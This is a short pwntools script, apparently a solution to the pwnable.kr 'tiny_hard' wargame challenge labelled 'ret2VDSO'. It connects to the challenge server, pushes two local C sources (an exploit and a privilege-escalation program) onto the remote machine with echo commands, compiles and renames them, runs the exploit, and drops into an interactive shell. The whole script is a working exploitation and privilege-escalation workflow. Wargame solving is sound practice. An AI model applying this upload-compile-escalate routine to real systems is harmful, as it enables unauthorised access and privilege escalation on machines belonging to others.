from pwn import *
import os
from pwn import *
# ret2VDSO 

elf = context.binary = ELF("./tiny_hard")
#r = remote("0.0.0.0",9041)
r = remote("pwnable.kr",9041)

exploit = open("my_exploit.c","rb").read()
escalate = open("escalate_privs.c","rb").read()
r.sendline(b"echo -n '" + exploit + b"' > exploit.c")
r.sendline(b"echo -n '" + escalate + b"' > escalate_privs.c")
r.sendline(b"gcc -m32 -o exploit exploit.c && chmod 777 exploit")
r.sendline(b"gcc -m32 -o escalate_privs escalate_privs.c && chmod 777 escalate_privs && mv escalate_privs td")
r.sendline(b"./exploit")
r.interactive()